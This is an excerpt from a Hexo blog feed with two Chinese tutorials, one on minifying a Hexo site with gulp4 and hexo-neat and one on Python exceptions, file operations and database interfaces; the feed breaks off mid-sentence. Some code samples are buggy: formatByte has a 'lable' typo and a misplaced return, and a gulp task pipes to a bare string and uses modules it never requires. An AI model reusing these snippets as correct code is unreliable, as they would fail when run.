        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这几天闲来无事，学习了下Hexo的博客速度优化，发现有好多方法。CDN加速、Coding部署、gulp压缩、hexo-neat、InstantClick 黑科技等等。这里记录下我使用gulp压缩进行Hexo速度优化和在此过程中遇到的问题，以及使用hexo-neat对Hexo进行速度优化。<br>这两种方法都是静态文件压缩，静态文件包括: html,css,js,images</p><h3 id="0x01-优化之前"><a href="#0x01-优化之前" class="headerlink" title="0x01 优化之前"></a>0x01 优化之前</h3><p>在博客速度优化之前，先来说说<code>在浏览器输入url到页面打开，都做了些什么？</code>，因为没怎么了解过，所以参考了很多博客，具体参考的博客链接在文末。<br>当在浏览器地址栏输入网址，如：<code>www.baidu.com</code>后浏览器是怎么把最终的页面呈现出来的呢？这个过程可以大致分为两个部分：网络通信和页面渲染。</p><h4 id="1、大致流程"><a href="#1、大致流程" class="headerlink" title="1、大致流程"></a>1、大致流程</h4><p>URL 解析-&gt;DNS 查询-&gt;TCP 连接-&gt;处理请求-&gt;接受响应-&gt;渲染页面<br>简单的来说，就是：</p><ul><li><p>浏览器里输入网址</p></li><li><p>浏览器查找域名对应的IP地址<br>DNS具体的查找过程，包括：浏览器缓存-&gt;系统缓存-&gt;路由器缓存-&gt;ISP DNS缓存-&gt;根域名服务器</p></li><li><p>浏览器向web服务器发送一个HTTP请求</p></li><li><p>服务器的永久重定向响应（从<code>http://baidu.com</code> 到 <code>http://www.baidu.com</code>）</p><blockquote><p>为什么要重定向？其中一个原因跟搜索引擎排名有关。如果一个页面有两个地址，就像<code>http://baidu.com/</code>和<code>http://www.baidu.com/</code>，搜索引擎会认为它们是两个网站，结果造成每一个的搜索链接都减少从而降低排名。所以要把带www的和不带www的地址归到同一个网站排名下。还有一个原因是用不同的地址会造成<code>缓存友好性变差</code>。</p></blockquote></li><li><p>浏览器跟踪重定向地址，发起GET请求</p></li><li><p>服务器”处理”请求，向浏览器发回一个HTML响应</p></li><li><p>浏览器解析显示HTML</p></li><li><p>浏览器发送请求获取嵌入在 HTML 中的资源（如图片、音频、视频、CSS、JS等等）</p></li><li><p>浏览器发送异步请求（ajax请求等）</p></li></ul><h4 id="2、简单分析"><a href="#2、简单分析" class="headerlink" title="2、简单分析"></a>2、简单分析</h4><p>从上面的过程可以看出，大部分过程我们无法控制，所以只能从浏览器端入手来找一些可以做的事情。<br><strong>少发送请求</strong></p><blockquote><p>把要加载的js文件（css文件同理）合并成一个（尽量少）文件，则可以向服务器少发送请求，从而减少等待时间。</p></blockquote><p><strong>压缩文件</strong></p><blockquote><p>使用压缩之后的js、css、img文件，同样可以减少请求时间。</p></blockquote><p><strong>Css Sprite</strong></p><blockquote><p>这是css的一项技术，将图片尽可能多的合并成一个图片文件，第一次使用的时候加载这张图片，然后浏览器会缓存下来，其他地方再使用的时候就不需要重新请求了。</p></blockquote><p><strong>js／css位置</strong></p><blockquote><p>css引用建议放在head标签里面；js脚本建议放到body内容的最后，原因：等待js加载或者脚本有错误的时候不会影响html页面的展示。</p></blockquote><p>那么怎么提高hexo这个静态博客的页面加载速度呢？可以从以下的几个方面去入手：</p><ol><li>将js文件尽可能放到body的闭合标签之前，因为在加载或者引入js文件时是阻塞式的，如果在页面的最开始就引入这些js文件，而这些文件又比较大，会造成页面在渲染时长时间处于白屏状态。</li><li>尽量避免去引用访问速度非常低下的cdn或者图片，可改用访问速度更快的cdn，或将难以迅速加载的图片保存到自己的站点目录下，以免在加载图片时耗费大量时间，最后还加载失败。</li><li>对页面的静态资源进行压缩，包括css、js和html等文件。<blockquote><p>我们自己添加的css和js文件为了可读性，往往会有很多换行和空格，这些对于浏览器来说并没什么用，甚至还会降低渲染页面的速度。<br>至于html文件，由于Markdown转成html的bug，会导致页面存在大量的空白，查看下页面的源代码，会发现有大量的空白符，这也会造成页面渲染的性能问题。</p></blockquote></li></ol><h3 id="0x02-gulp4压缩静态文件"><a href="#0x02-gulp4压缩静态文件" class="headerlink" title="0x02 gulp4压缩静态文件"></a>0x02 gulp4压缩静态文件</h3><h4 id="1、安装gulp"><a href="#1、安装gulp" class="headerlink" title="1、安装gulp"></a>1、安装gulp</h4><p>在站点根目录下安装<br><strong>1.安装gulp工具</strong></p><pre><code class="shell">npm install gulp -g</code></pre><p><strong>2.安装gulp插件</strong></p><pre><code class="shell">npm install gulp-minify-html gulp-minify-css gulp-uglify gulp-imagemin --save# 解决【Gulp打包问题】 GulpUglifyError: unable to minify JavaScript# 解决 gulp-uglify 压缩JavaScript 不兼容 es5 语法的问题#npm install babel-core@6.26.3 --save#npm install gulp-babel@7.0.1 --save#npm install babel-preset-es2015@6.24.1 --save# gulp-babel 取消严格模式方法(&quot;use strict&quot;)#npm install gulp-remove-use-strict --save#问题：如果安装gulp-imagemin错误请执行以下语句#sudo npm i gulp-imagemin --unsafe-perms</code></pre><h3 id="2、建立gulpfile-js文件"><a href="#2、建立gulpfile-js文件" class="headerlink" title="2、建立gulpfile.js文件"></a>2、建立gulpfile.js文件</h3><p>在站点根目录下创建gulpfile.js</p><pre><code class="javascript">var gulp = require(&#39;gulp&#39;);//Plugins模块获取var minifycss = require(&#39;gulp-minify-css&#39;);var uglify = require(&#39;gulp-uglify&#39;);var minifyhtml = require(&#39;gulp-minify-html&#39;);// 压缩 public 目录 css文件gulp.task(&#39;minify-css&#39;, function () {    return gulp.src(&#39;./public/**/*.css&#39;)        .pipe(minifycss())        .pipe(gulp.dest(&#39;./public&#39;));});// 压缩 public 目录 html文件gulp.task(&#39;minify-html&#39;, function () {    return gulp.src(&#39;./public/**/*.html&#39;)        .pipe(minifyhtml())        .pipe(gulp.dest(&#39;./public&#39;))});// 压缩 public/js 目录 js文件，忽略/public/lib/blog-encrypt.jsgulp.task(&#39;minify-js&#39;, function () {    //纠错前：return gulp.src(&#39;./public/**/*.js&#39;)    return gulp.src([&#39;./public/**/*.js&#39;, &#39;!./public/lib/blog-encrypt.js&#39;])        .pipe(uglify())        .pipe(gulp.dest(&#39;./public&#39;))});// 压缩图片//gulp.task(&#39;minify-images&#39;, function() {//    return gulp.src(&#39;./public/images/**/*.*&#39;)//        .pipe(imagemin(//        [imagemin.gifsicle({&#39;optimizationLevel&#39;: 3}),//        imagemin.jpegtran({&#39;progressive&#39;: true}),//        imagemin.optipng({&#39;optimizationLevel&#39;: 7}),//        imagemin.svgo()],//        {&#39;verbose&#39;: true}))//        .pipe(gulp.dest(&#39;./public/images&#39;))//});//因为我图片用的第三方图床存放的，所以就没压缩图片。(并且最后测试压缩图片时，发现有点权限问题，//整了两个多小时没整好！@^@)// 分别执行css、heml、js的压缩任务gulp.task(&#39;default&#39;, gulp.parallel(&#39;minify-css&#39;, &#39;minify-html&#39;, &#39;minify-js&#39;));</code></pre><p><strong>注</strong>：<br>1.修改上面的各个目录为你的真实目录， <code>**</code> 代表0或多个子目录<br>2.在默认任务中，gulp.parallel()是gulp4中的新写法：<br><code>gulp.series</code> 用于串行(顺序)执行<br><code>gulp.parallel</code> 用于并行执行<br>3.部署执行</p><pre><code class="shell">hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d</code></pre><p>感觉命令有点多，也可以直接在<code>package.json</code>文件里添加</p><pre><code class="js">&quot;scripts&quot;: {    &quot;hexo&quot;: &quot;hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d&quot;},</code></pre><p>然后在博客根目录执行<code>npm run hexo</code>即可<br><img src="http://img-blog.csdnimg.cn/20200205191852790.jpg" alt="在这里插入图片描述"></p><h4 id="3、遇到的问题"><a href="#3、遇到的问题" class="headerlink" title="3、遇到的问题"></a>3、遇到的问题</h4><p>在使用gup4压缩静态文件时遇到一些问题，总结一下：<br><strong>1.gulp4的默认任务执行问题</strong></p><pre><code class="js">//4.0以前的写法 //gulp.task(&#39;default&#39;, [&#39;minify-html&#39;, &#39;minify-css&#39;, &#39;minify-js&#39;]);//4.0以后的写法// 执行 gulp 命令时执行的任务gulp.task(&#39;default&#39;, gulp.parallel(&#39;minify-css&#39;, &#39;minify-html&#39;, &#39;minify-js&#39;));</code></pre><p><strong>2.TypeError: dest.on is not a function</strong><br>先检查<code>gulpfile.js</code>若没有问题，删掉<code>node_modules</code>，重装一遍依赖<code>npm install</code></p><p><strong>3.GulpUglifyError: unable to minify JavaScript(Gulp打包问题)</strong><br>错误原因有很多，如：有的文件不能打包、javascirpt语法问题等等。我遇到的问题是有的文件不能打包。<br>（1）解决方法1：<br>检查哪一个文件中的哪一行有问题，安装 gulp-util 模块 用于打印日志</p><pre><code class="shell">npm install --save-dev gulp-util</code></pre><p>在<code>gulpfile.js</code>里添加：</p><pre><code class="js">gulp.task(&#39;script&#39;, function() {    gulp.src([&#39;public/**/*.js&#39;, &#39;public/lib/**/*.js&#39;])        .pipe(uglify())        .on(&#39;error&#39;, function(err) {            gutil.log(gutil.colors.red(&#39;[Error]&#39;), err.toString());        })        .pipe(&#39;dist/js&#39;)})</code></pre><p>执行<code>gulp script</code>，这样就可以精准的逐个排查文件了。这里我排查到：<br><img src="http://img-blog.csdnimg.cn/20200206003139331.jpg" alt="在这里插入图片描述"><br>发现<code>blog-encrypt.js</code>有问题，在<code>gulpfile.js</code>忽略<code>blog-encrypt.js</code>即可，即</p><pre><code class="javascript">// 压缩 public/js 目录 js文件gulp.task(&#39;minify-js&#39;, function () {    //纠错前：return gulp.src(&#39;./public/**/*.js&#39;)    return gulp.src([&#39;./public/**/*.js&#39;, &#39;!./public/lib/blog-encrypt.js&#39;])        .pipe(uglify())        .pipe(gulp.dest(&#39;./public&#39;))});</code></pre><p>（2）解决方法2：<br>继续方法1 安装 babel 模块<br><code>gulp-babel</code>、<code>babel-preset-es2015</code></p><pre><code class="shell">npm install --save-dev gulp-babel babel-preset-es2015</code></pre><pre><code class="javascript">gulp.task(&#39;script&#39;, function() {    gulp.src([&#39;public/**/*.js&#39;, &#39;public/lib/**/*.js&#39;])        .pipe(babel({            presets: [&#39;es2015&#39;] // es5检查机制        }))        .pipe(uglify())        .on(&#39;error&#39;, function(err) {            gutil.log(gutil.colors.red(&#39;[Error]&#39;), err.toString());        })        .pipe(&#39;dist/js&#39;)})</code></pre><p>这样就解决 <code>gulp-uglify</code> 压缩JavaScript 不兼容 es5 语法的问题了。<br><strong>4.The following tasks did not complete: html Did you forget to signal async completion?</strong><br>运行<code>gulp</code>，出现下面报错：</p><pre><code class="shell"> The following tasks did not complete: html  Did you forget to signal async completion?</code></pre><p>解决办法：在注册的任务函数里使用 async 和 await。</p><pre><code class="javascript">gulp.task(&quot;html&quot;,async()=&gt;{    await gulp.src(folder.src + &quot;html/*&quot;)    .pipe(htmlClean())    .pipe(gulp.dest(folder.build + &quot;html&quot;))})</code></pre><p>gulp4安装使用过程中，我暂时就遇到上面这几种错误。除了上述错误，还有很多可能会出错的地方，这里有个博客记录了一些：<a href="https://www.jianshu.com/p/524d828e74e4" target="_blank" rel="noopener">gulp 错误集锦</a></p><h3 id="0x03-hexo-neat压缩静态文件"><a href="#0x03-hexo-neat压缩静态文件" class="headerlink" title="0x03 hexo-neat压缩静态文件"></a>0x03 hexo-neat压缩静态文件</h3><p><code>hexo-neat</code>是由rozbo大佬开发的压缩插件，配置简单，无需额外命令，只要使用原本的调试三连或者部署三连就可以自动完成静态资源的压缩</p><h3 id="1、安装hexo-neat"><a href="#1、安装hexo-neat" class="headerlink" title="1、安装hexo-neat"></a>1、安装hexo-neat</h3><p>在站点根目录下</p><pre><code class="shell">npm install hexo-neat --save</code></pre><h4 id="2、添加相关配置"><a href="#2、添加相关配置" class="headerlink" title="2、添加相关配置"></a>2、添加相关配置</h4><p>在站点配置文件<code>_config.yml</code>添加相关配置，直接添加到站点配置文件<code>_config.yml</code>的末尾就可以。可以安装自己的需求去自定义配置，不过有些注意事项</p><pre><code class="yml"># hexo-neat# 博文压缩neat_enable: true# 压缩htmlneat_html:  enable: true  exclude:# 压缩css  neat_css:  enable: true  exclude:    - &#39;**/*.min.css&#39;# 压缩jsneat_js:  enable: true  mangle: true  output:  compress:  exclude:    - &#39;**/*.min.js&#39;    - &#39;**/jquery.fancybox.pack.js&#39;    - &#39;**/index.js&#39;  </code></pre><h4 id="3、hexo-neat插件注意事项"><a href="#3、hexo-neat插件注意事项" class="headerlink" title="3、hexo-neat插件注意事项"></a>3、hexo-neat插件注意事项</h4><p>在使用hexo-neat插件时，可以在命令窗口中看到各个文件的压缩率，于是可以通过跳过一些文件让效率更高。<br><strong>1.跳过压缩文件的正确配置方式</strong><br>如果按照官方插件的文档说明来配置exclude，会发现完全不起作用。这是因为配置的文件路径不对，压缩时找不到你配置的文件，自然也就无法跳过了。于是需要给这些文件指定正确的路径，万能的配置方式如下：</p><pre><code class="yml">neat_css:  enable: true  exclude:    - &#39;**/*.min.css&#39;</code></pre><p><strong>2.压缩html时不要跳过<code>.md</code>文件和<code>.swig</code>文件</strong><br><code>.md</code>文件就是markdown文件，如果跳过压缩<code>.md</code>文件，而又刚好在文章中使用到了tab标签，那么当hexo在生成静态页面时就会发生解析错误。这会导致使用到了tab标签的页面生成失败而无法访问。</p><p><code>.swig</code>文件是模板引擎文件，也就是hexo可以通过这些文件来生成对应的页面。如果跳过这些文件，所有页面完全没有起到压缩的效果，页面源代码里依然存在着一大堆空白。<br><img src="https://img-blog.csdnimg.cn/20200208013355617.png" alt="在这里插入图片描述"></p><h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>对Hexo进行简单的速度优化过程中，我主要学习了从输入url到页面打开的过程、使用gup4和hexo-neat进行速度优化，最好的速度优化方式应该是使用CDN加速，在下太穷，所以没使用。同时在使用gup4速度优化过程中也培养了自己的纠错改错的能力，继续加油！！！</p><p>参考博客：<br><a href="https://4ark.me/post/b6c7c0a2.html" target="_blank" rel="noopener">在浏览器输入 URL 回车之后发生了什么（超详细版）</a><br><a href="https://www.cnblogs.com/xiaohuochai/p/9193083.html" target="_blank" rel="noopener">从输入URL到页面加载的全过程</a><br><a href="http://www.dailichun.com/2018/03/12/whenyouenteraurl.html" target="_blank" rel="noopener">从输入URL到页面加载的过程？如何由一道题完善自己的前端知识体系！</a><br><a href="https://www.cnblogs.com/kongxy/p/4615226.html" target="_blank" rel="noopener">从输入URL到浏览器显示页面发生了什么</a><br><a href="https://zhuanlan.zhihu.com/p/40777409" target="_blank" rel="noopener">网络通信总结（TCP/IP协议、HTTP协议等）</a></p><p><a href="https://sesprie.bid/website/hexo-03.html" target="_blank" rel="noopener">Hexo折腾记——性能优化篇</a><br><a href="https://io-oi.me/tech/speed-up-hexo/" target="_blank" rel="noopener">加速 Hexo 博客</a><br><a href="https://blog.csdn.net/java_1996/article/details/86499625" target="_blank" rel="noopener">基于Hexo搭建个人博客优化(五)—压缩篇(gulp4.0压缩静态资源)</a><br><a href="http://luckykun.com/work/2016-07-10/hexo-faster.html" target="_blank" rel="noopener">hexo博客进阶－性能优化</a><br><a href="https://todebug.com/use-gulp-with-hexo/" target="_blank" rel="noopener">hexo优化之——使用gulp压缩资源</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Hexo性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习-基础篇(四)</title>
      <link href="/2020/01/21/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E5%9B%9B)/"/>
      <url>/2020/01/21/Python%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇包含：<strong>异常处理及程序调试、文件及目录操作、操作数据库</strong></p><h3 id="八、异常处理及程序调试"><a href="#八、异常处理及程序调试" class="headerlink" title="八、异常处理及程序调试"></a>八、异常处理及程序调试</h3><p><a href="http://www.cnblogs.com/bactiy/p/10102862.html" target="_blank" rel="noopener">Python 常见异常类型</a></p><h4 id="1、异常处理语句"><a href="#1、异常处理语句" class="headerlink" title="1、异常处理语句"></a>1、异常处理语句</h4><p><strong>1.try…except语句</strong></p><pre><code class="python">try:    语句块1except [ExceptionName [as alias]]:    语句块2#ExceptionName指定要捕获的异常；不指定，处理所有异常#出现异常，执行语块2#处理多个异常：except (异常1,异常2) as alias:</code></pre><pre><code class="python">def chufa(): #除法    a = int(input(&quot;请输入被除数:&quot;))    b = int(input(&quot;请输入除数:&quot;))    print(a,&quot;除以&quot;,b,&quot;的结果为:&quot;,a/b)if __name__ == &#39;__main__&#39;:    try:        chufa()    except ZeroDivisionError:        print(&quot;\n被除数不能为0！！！&quot;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119214519317.jpg" alt="在这里插入图片描述"><br><strong>2.try…except…else语句</strong></p><pre><code class="python">try:    语句块1except [ExceptionName [as alias]]:    语句块2else:    语句块3#没有出现异常，执行语块3；出现异常不执行语块3</code></pre><p><strong>3.try…except…finally语句</strong></p><pre><code class="python">try:    语句块1except [ExceptionName [as alias]]:    语句块2finally:    语句块3#无论是否出现异常，都执行语块3</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119220051764.png" alt="在这里插入图片描述"><br><strong>4.使用raise语句抛出异常</strong><br>某个方法或函数可能会产生异常，不想在当前的方法或函数处理异常，可以使用raise语句在方法或函数中抛出异常。</p><pre><code class="python">raise [ExceptionName[(reason)]]#reason异常信息描述#省略[ExceptionName[(reason)]]会把异常原样抛出#省略[(reason)]，异常不带描述信息</code></pre><pre><code class="python">def chufa(): #除法    a = int(input(&quot;请输入被除数:&quot;))    b = int(input(&quot;请输入除数:&quot;))    if a &lt; b:        raise ValueError(&quot;这里被除数要大于除数！&quot;)    print(a,&quot;除以&quot;,b,&quot;的结果为:&quot;,a/b)if __name__ == &#39;__main__&#39;:    chufa()</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119221701495.jpg" alt="在这里插入图片描述"></p><h4 id="2、程序调试"><a href="#2、程序调试" class="headerlink" title="2、程序调试"></a>2、程序调试</h4><p><strong>1.使用自带的IDLE进行程序调试</strong><br>IDLE-&gt;Debug-&gt;Debugger<br>添加断点：在要添加断点的行-&gt;右键-&gt;Set Breakpoint<br><a href="http://blog.csdn.net/forcoin/article/details/81407278" target="_blank" rel="noopener">使用 python IDLE 自带的 debuger 进行调试</a><br><strong>2.使用assert语句调试程序</strong></p><pre><code class="python">assert expression [,reason]#expression 表达式为真时，什么都不做，表达式为假时，抛出AssertionError异常；#reason可选参数，用于对判断条件进行描述，为了以后更好的知道哪里出现了问题。</code></pre><p>assert语句只在调试阶段有效.所以我们平时测试用的debug版本才会有断言挂起,release版本没有断言</p><pre><code class="python">apple=int(input(&quot;请输入苹果数量：&quot;))children=int(input(&quot;请输入小朋友的数量：&quot;))assert apple&gt;children,&quot;苹果不够分&quot;#结果请输入苹果数量：10请输入小朋友的数量：20Traceback (most recent call last):  File &quot;C:\Python27\main.py&quot;, line 9, in &lt;module&gt;    assert apple&gt;children,&quot;苹果不够分&quot;AssertionError: 苹果不够分</code></pre><p><strong>注</strong>：<br>（1）断言只能作为辅助调试手段使用，在表达式为False时抛出异常终止程序执行，不能在程序中代替条件判断语句，因为程序以优化方式运行时不会执行断言语句。<br>（2）添加-O参数程序运行在优化模式，不会输出断言：<code>python -O 文件名.py</code></p><h3 id="九、文件及目录操作"><a href="#九、文件及目录操作" class="headerlink" title="九、文件及目录操作"></a>九、文件及目录操作</h3><h4 id="1、基本文件操作"><a href="#1、基本文件操作" class="headerlink" title="1、基本文件操作"></a>1、基本文件操作</h4><p>打开文件-&gt;写入内容-&gt;关闭文件<br>打开文件-&gt;读取内容-&gt;(关闭文件,也可以不关闭)<br><strong>1.创建和打开文件</strong></p><pre><code class="python">file = open(filename[,mode[,buffering]])#mode文件打开模式：r只读、w只写、a追加#buffering指定读写的缓存模式：0不缓存、1缓存、大于1缓冲区大小</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119225712365.png" alt="在这里插入图片描述"></p><pre><code class="python">file = open(&#39;qwzf.txt&#39;,&#39;w&#39;) #创建文件file = open(&#39;qwzf.txt&#39;,&#39;r&#39;) #打开gbk文件file = open(&#39;qwzf.txt&#39;,&#39;r&#39;,encoding = &quot;utf-8&quot;) #打开utf-8文件file = open(&#39;qwzf.jpg&#39;,&#39;rb&#39;)#以二进制形式打开文件</code></pre><p><strong>2.关闭文件</strong></p><pre><code class="python">file.close()</code></pre><p>判断文件是否关闭：<code>print(file.closed)</code><br><strong>3.打开文件时使用with语句</strong><br>使用with语句打开文件，可以自动关闭文件</p><pre><code class="python">with expression as target:    with-body#expression可以指定要打开文件的open函数#as target指定变量，target保存表达式的结果#with-body语句体</code></pre><pre><code class="python">with open(&#39;qwzf.txt&#39;,&#39;r&#39;,encoding = &quot;utf-8&quot;) as file: #打开文件    pass</code></pre><p><strong>4.写入文件内容</strong></p><pre><code class="python">file.write(string)</code></pre><pre><code class="python">file = open(&#39;qwzf.txt&#39;,&#39;w&#39;,encoding = &quot;utf-8&quot;) #打开文件file.write(&quot;我学Python&quot;) #写入内容file.close() #关闭文件</code></pre><p>如果不想关闭并把内容写入文件，可以使用<code>file.flush()</code> 把缓冲区内容写入文件<br>将列表内容写入文件</p><pre><code class="python">list1 = [&quot;qwzf&quot;,&quot;lemon&quot;,&quot;chumen007&quot;]with open(&quot;qwzf.txt&quot;,&quot;w&quot;) as file:    file.writelines([line + &quot;\n&quot; for line in list1])</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119233826700.jpg" alt="在这里插入图片描述"><br><strong>5.读取文件</strong><br>文件打开模式只能是<code>r</code>(只读)或<code>r+</code>(读写)<br>（1）读取指定字符：<code>file.read([size])</code><br><code>file.seek()</code>将文件指针移到要截取的位置</p><pre><code class="python">with open(&quot;qwzf.txt&quot;,&quot;r&quot;) as file: #打开文件    print(&quot;文件内容:&quot;,file.read())    file.seek(10) #定位到第10个字节    string = file.read(2) #读取两个字符    print(string)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200119235813762.jpg" alt="在这里插入图片描述"><br>（2）读取一行：<code>file.readline()</code></p><pre><code class="python">with open(&quot;qwzf.txt&quot;,&quot;r&quot;) as file: #打开文件    num = 0 #记录行号    while True:        num += 1        line = file.readline() #读取一行        if line == &quot;&quot;:            break        print(num,line,end=&quot;\n&quot;) #输出一行</code></pre><p><img src="http://img-blog.csdnimg.cn/20200120001435528.jpg" alt="在这里插入图片描述"><br>（3）读取全部行：<code>file.readlines()</code>，返回字符串列表</p><h4 id="2、目录操作"><a href="#2、目录操作" class="headerlink" title="2、目录操作"></a>2、目录操作</h4><p><strong>1.os和os.path模块</strong><br>os模块是Python内置的与操作系统功能和文件系统相关的模块。该模块的语句的执行结果通常与操作系统有关。<br>os.path模块是os模块的子模块<br><a href="https://www.cnblogs.com/ginvip/p/6439679.html" target="_blank" rel="noopener">python之OS模块详解</a><br><a href="https://blog.csdn.net/qq_36016375/article/details/91533728" target="_blank" rel="noopener">python之os模块</a><br><a href="https://blog.csdn.net/xxlovesht/article/details/80913193" target="_blank" rel="noopener">Python必学的OS模块详解</a><br><strong>2.路径</strong><br><code>os.getcwd()</code>获取文件当前工作目录<br><code>os.path.abspath(path)</code>获取文件绝对路径<br><code>os.path.join(path1[,path2[,...]])</code>拼接路径<br>path：路径</p><pre><code class="python">import osprint(&quot;当前工作目录:&quot;,os.getcwd())with open(&quot;test/qwzf.txt&quot;,&quot;r&quot;) as file: #通过相对路径打开文件    print(file.read())print(&quot;文件绝对路径:&quot;,os.path.abspath(&quot;test/qwzf.txt&quot;))print(&quot;拼接路径:&quot;,os.path.join(r&quot;F:\Python&quot;,r&quot;test\qwzf.txt&quot;))#拼接路径不会检查目录是否存在</code></pre><p><img src="http://img-blog.csdnimg.cn/20200120210249654.jpg" alt="在这里插入图片描述"><br><strong>3.判断目录是否存在</strong><br><code>os.path.exists(path)</code>判断目录(文件)是否存在，不区分大小写<br><strong>4.创建目录</strong><br><code>os.mkdir(path,mode=0o777)</code> mode指定数值模式，可省略</p><pre><code class="python">import osif not os.path.exists(r&quot;D:\demo&quot;):    os.mkdir(r&quot;D:\demo&quot;)else:    print(&quot;该目录已存在&quot;)</code></pre><p><em>创建多级目录</em><br>（1）递归调用<code>os.mkdir()</code></p><pre><code class="python">import osdef mkdir(path): #创建一个递归函数用于创建目录    if not os.path.isdir(path): #判断是否为路径        mkdir(os.path.split(path)[0])    else:        return    os.mkdir(path) #创建目录mkdir(r&quot;D:\demo\qwzf1\qwzf2&quot;)</code></pre><p>（2）<code>os.makedirs(name,mode=0o777)</code>创建多级目录</p><pre><code class="python">import osos.makedirs(r&quot;D:\demo\qwzf\qwzf2020&quot;) #创建多级目录</code></pre><p><strong>5.删除目录</strong><br>删除空目录：<code>os.rmdir(path)</code><br>删除非空目录：<code>shutil.rmtree(path)</code></p><pre><code class="python">import shutilshutil.rmtree(r&quot;D:\demo&quot;) #删除非空目录</code></pre><p><strong>6.遍历目录</strong></p><pre><code class="python">os.walk(top[,topdown][,onerror][,followlinks])#top 指定要遍历内容的根目录#topdown 可选,为 True,则优先遍历top目录,否则优先遍历 top 的子目录(默认为开启)。#onerror 可选，指定错误处理方式#followlinks 可选,如果为 True，访问软链接指向的目录，默认开启&#39;&#39;&#39;返回值：元组生成器对象(dirpath,dirnames,filenames)dirpath 字符串 当前正在遍历的路径dirnames 列表 当前路径下包含的子目录filenames 列表 当前路径下包含的文件&#39;&#39;&#39;</code></pre><pre><code class="python">import ospath = r&quot;F:\Python\test&quot;print(&quot;未整理前的遍历结果:&quot;)for p in os.walk(path):    print(p,&quot;\n&quot;)print(&quot;整理后的遍历结果:&quot;)print(&quot;【&quot;,path,&quot;】目录下包含的文件和目录:&quot;)for root,dirs,files in os.walk(path): #遍历指定目录    for dirname in dirs:        print(os.path.join(root,dirname)) #输出遍历到的目录    for filename in files:        print(&quot;\t&quot;,os.path.join(root,filename)) #输出遍历到的目录</code></pre><p><img src="http://img-blog.csdnimg.cn/20200120221241701.jpg" alt="在这里插入图片描述"></p><h4 id="3、高级文件操作"><a href="#3、高级文件操作" class="headerlink" title="3、高级文件操作"></a>3、高级文件操作</h4><p><strong>1.删除文件<code>os.remove(path)</code></strong><br><strong>2.重命名文件和目录</strong></p><pre><code class="python">os.rename(src,dst)#src要进行重命名的目录或文件路径#dst重命名之后的目录或文件路径</code></pre><p><strong>3.获取文件基本信息<code>os.stat(path)</code></strong><br><a href="https://www.runoob.com/python/os-stat.html" target="_blank" rel="noopener">os.stat() 方法</a><br><a href="https://www.jianshu.com/p/413b77258217" target="_blank" rel="noopener">python获取文件信息</a></p><pre><code class="python">import osdef formatTime(longtime):    &#39;&#39;&#39;格式化时间的函数&#39;&#39;&#39;    import time    return time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime(longtime))def formatByte(number):    &#39;&#39;&#39;格式化文件大小的函数&#39;&#39;&#39;    for(scale,label) in [(1024*1024*1024,&quot;GB&quot;),(1024*1024,&quot;MB&quot;),(1024,&quot;KB&quot;)]:        if number&gt;=scale:            return  &quot;%.2f %s&quot; %(number*1.0/scale,lable)        elif number ==1:            return  &quot;1字节&quot;        else: #小于1字节            byte = &quot;%.2f&quot; % (number or 0)        return (byte[:-3] if byte.endswith(&quot;.00&quot;) else byte) + &quot;字节&quot;fileinfo = os.stat(&quot;qwzf.png&quot;)  #获取文件的基本信息print(&quot;文件完整路径：&quot;,os.path.abspath(&quot;qwzf.png&quot;))  #获取文件的完整路径#输出文件的基本信息print(&quot;索引号:&quot;,fileinfo.st_ino)print(&quot;设备名:&quot;,fileinfo.st_dev)print(&quot;文件大小:&quot;,formatByte(fileinfo.st_size))print(&quot;最后一次访问时间:&quot;,formatTime(fileinfo.st_atime))print(&quot;最后一次修改时间:&quot;,formatTime(fileinfo.st_mtime))print(&quot;最后一次状态变化的时间:&quot;,formatTime(fileinfo.st_ctime))</code></pre><p><img src="http://img-blog.csdnimg.cn/20200120225927775.jpg" alt="在这里插入图片描述"></p><h3 id="十、操作数据库"><a href="#十、操作数据库" class="headerlink" title="十、操作数据库"></a>十、操作数据库</h3><h4 id="1、数据库编程接口"><a href="#1、数据库编程接口" class="headerlink" title="1、数据库编程接口"></a>1、数据库编程接口</h4><p>Python操作数据库的规范：<a href="https://www.python.org/dev/peps/pep-0249/" target="_blank" rel="noopener">DB_API</a><br>参考：<a href="https://www.cnblogs.com/marvintang1001/p/10930837.html" target="_blank" rel="noopener">数据库__DB-API</a>、<a href="https://www.cnblogs.com/Jweiqing/p/9000061.html" target="_blank" rel="noopener">Python DB-API</a><br><strong>1.连接对象</strong><br>connect()函数-&gt;Connection对象<br>Connection()的常用参数列表：</p><blockquote><p>dsn:数据源名称.给出该参数表示数据库依赖<br>    user: 数据库登陆名.默认是当前用户<br>    password: 数据库登陆的秘密.默认为空<br>    host: 数据库主机名.默认是用本地主机<br>    database(db): 要使用的数据库名.没有默认值<br>    port: MySQL服务使用的TCP端口.默认是3306<br>    charset: 数据库编码. utf-8</p></blockquote><p>Connection对象常用方法：</p><blockquote><p>cursor()    :使用该连接创建并返回游标(获取游标对象，操作数据库。)<br>commit():提交当前事务<br>rollback():回滚当前事务<br>close():关闭数据库连接</p></blockquote><p><strong>2.游标对象</strong><br>Connection对象-&gt;cursor()-&gt;Cursor对象<br>Cursor对象常用方法：</p><blockquote><p>callproc(procname,[,parameters]):调用存储过程，需要数据库支持<br>close():关闭当前游标对象<br>excute(sql[, args]):执行一个数据库查询或命令<br>excutemany(sql, 